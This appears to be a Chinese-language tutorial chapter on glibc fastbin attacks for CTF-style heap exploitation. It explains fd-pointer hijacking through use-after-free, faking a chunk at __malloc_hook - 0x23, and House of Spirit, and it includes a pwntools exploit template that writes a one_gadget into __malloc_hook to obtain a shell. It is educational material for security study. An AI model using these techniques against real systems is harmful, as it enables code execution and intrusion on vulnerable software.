# 第 21 章 Fastbin Attack

> fastbin 是一个用 fd 指针串起来的单向链表。如果能让 fd 指向伪造的 chunk，malloc 就会乖乖地返回那个地址——哪怕它根本不是真正的堆内存。

---

## 21.1 fastbin 的单向链表

fastbin 管理 ≤ 0x80 字节的空闲 chunk，共 10 个链表，每个链表是**单向**（只有 fd 指针）、**LIFO**（后进先出）的。

```text
fastbin[3] (0x40 大小的 chunk):
   ┌─────────┐      ┌─────────┐      ┌─────────┐
   │ chunk A │─fd──▶│ chunk B │─fd──▶│ chunk C │─fd──▶ NULL
   └─────────┘      └─────────┘      └─────────┘
    链表头            A.fd=B           B.fd=C
```

free 一个 chunk 时，它被挂到链表头：

```c
chunk->fd = fastbin_head;
fastbin_head = chunk;
```

malloc 时，从链表头取一个：

```c
result = fastbin_head;
fastbin_head = result->fd;    // 沿着 fd 走
```

**关键点**：malloc 取走链表头后，会把 `fastbin_head` 设为被取走 chunk 的 **fd 值**。如果我们能控制这个 fd，就能控制下一次 malloc 返回的地址！

---

## 21.2 fd 指针劫持原理

假设有一个 UAF 漏洞可以修改已释放 chunk 的 fd：

```text
1. malloc A（0x40）
2. free A → fastbin: A → NULL，A.fd = NULL
3. UAF 写：A.fd = fake_addr
4. malloc → 返回 A，fastbin_head = A.fd = fake_addr
5. malloc → 返回 fake_addr！
```

第 5 步，malloc 从 fastbin 里取出了 `fake_addr` 当作空闲 chunk 返回给用户。如果我们能让 `fake_addr` 指向一个敏感位置（比如 `__malloc_hook`），就能往那里写数据。

---

## 21.3 fake chunk 的构造：size 检查

malloc 从 fastbin 取 chunk 时，会做检查：

```c
// 简化版检查
if (fastbin_index(chunksize(victim)) != idx) {
    // 报错：malloc(): memory corruption (fast)
}
```

也就是说，**伪造地址处的 size 字段必须和 fastbin 链表的大小匹配**。

例如，我们想从 `fastbin[4]`（0x50 大小）里取出一个 chunk，伪造地址 `fake_addr` 处的 size 必须是 `0x51` 或 `0x50` 附近的值（因为 `chunksize = size & ~0x7`）。

### 寻找天然的 fake chunk

我们需要内存中一个位置，它的「前 8 字节」刚好是合适的 size 值。经典目标是 **`__malloc_hook - 0x23`**：

```text
__malloc_hook 地址: 0x7f1234567890
__malloc_hook - 0x23: 0x7f123456786d

在这个地址处观察内存：
0x7f123456786d:  ?? ?? ?? ?? ?? ?? ?? ??   （作为 prev_size）
0x7f1234567875:  00 00 00 00 00 00 00 7f   （作为 size = 0x7f00000000000000）
```

由于 libc 的地址是 `0x7f...` 开头，`__malloc_hook - 0x23` 处的「size 字段」正好是 `0x7f`（小端序看低字节是 0x7f，高字节是 0x00），而 `fastbin_index(0x7f)` 对应的大小... 这个技巧依赖具体 libc 的内存布局。

> 💡 **提示**：`__malloc_hook - 0x23` 是经典技巧，但在不同 libc 版本中偏移量不同。用 gdb 查看 `__malloc_hook` 附近的内存，找到合适的「size」值。

 pwndbg 有便捷命令：

```gdb
# 查看 __malloc_hook 附近的内存
x/20gx &__malloc_hook - 0x30

# 自动找 fake chunk
find_fake_fast &__malloc_hook 0x70
```

---

## 21.4 实战：fastbin attack 到 __malloc_hook

### 条件

- glibc < 2.34（`__malloc_hook` 还存在）
- 有一个 UAF 或 double free 漏洞能修改 fastbin chunk 的 fd

### 利用步骤

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process(elf.path)

# 1. 泄露 libc 基址（通过 unsorted bin leak 或其他方式）
# ... 假设已得到 libc_base

malloc_hook = libc_base + libc.sym['__malloc_hook']
fake_chunk = malloc_hook - 0x23
one_gadget = libc_base + 0x50d70    # 用 one_gadget 工具找

# 2. 分配两个 0x70 大小的 chunk（进入 fastbin[?]）
add(0, 0x60, b'A')   # chunk size 0x70
add(1, 0x60, b'B')

# 3. 释放它们，形成 fastbin 链表
delete(0)
delete(1)
# fastbin: 1 → 0 → NULL

# 4. 通过 UAF 修改 chunk 1 的 fd 指向 fake chunk
edit(1, p64(fake_chunk))
# fastbin: 1 → fake_chunk

# 5. 两次 malloc，第二次拿到 fake_chunk
add(2, 0x60, b'C')   # 返回 chunk 1
add(3, 0x60, b'X' * 0x13 + p64(one_gadget))   # 返回 fake_chunk
# 写入 one_gadget 到 __malloc_hook

# 6. 触发 malloc → 调用 __malloc_hook → one_gadget → getshell
add(4, 0x20, b'trigger')
p.interactive()
```

> ⚠️ **注意**：glibc 2.31 对 fastbin 的对齐检查更严格（要求 0x10 对齐），所以 fake chunk 的地址可能需要调整（比如 `malloc_hook - 0x23` 改为 `malloc_hook - 0x13` 或其他）。实际做题时用 gdb 调试确认。

---

## 21.5 House of Spirit

**House of Spirit** 是 fastbin attack 的一个变种：不劫持 fd，而是**伪造一个完整的 chunk**，然后让程序 free 它，使它进入 fastbin，再通过 malloc 取出来。

条件：

1. 能控制一块内存的开头（伪造 chunk 头）
2. 能触发 free 指向这块内存
3. 伪造的 chunk 大小和位置合法

```python
# 目标：让 free(fake_chunk_ptr) 把一个伪造的 chunk 放进 fastbin
fake_chunk_addr = stack_or_bss_addr

# 在 fake_chunk_addr 处布置：
# prev_size = 任意
# size = 0x71（合法 fastbin 大小，且 PREV_INUSE=1）

# 然后触发 free(fake_chunk_addr + 0x10)
# 该 chunk 进入 fastbin
# 下次 malloc(0x60) 返回 fake_chunk_addr + 0x10
```

House of Spirit 常用于栈上（当栈上数据可控时），把栈地址变成可分配的 chunk，然后在栈上构造 ROP。

---

## 21.6 小结

这一章我们学了 Fastbin Attack：

- **fastbin 是单向链表**，malloc 取 chunk 时会沿 fd 走
- **劫持 fd** 可以让 malloc 返回任意地址
- **size 检查**：伪造地址处的 size 字段必须匹配 fastbin 的大小
- **经典目标**：`__malloc_hook - 0x23`（glibc < 2.34）
- **House of Spirit**：伪造 chunk 让 free 收进 fastbin

下一章我们学习 Tcache Attack——tcache 是更现代的缓存机制，检查更宽松（没有 size 检查），所以 tcache poisoning 比 fastbin attack 更强大。

---

**下一章**：[Tcache Attack](./ch22-Tcache-Attack.md)
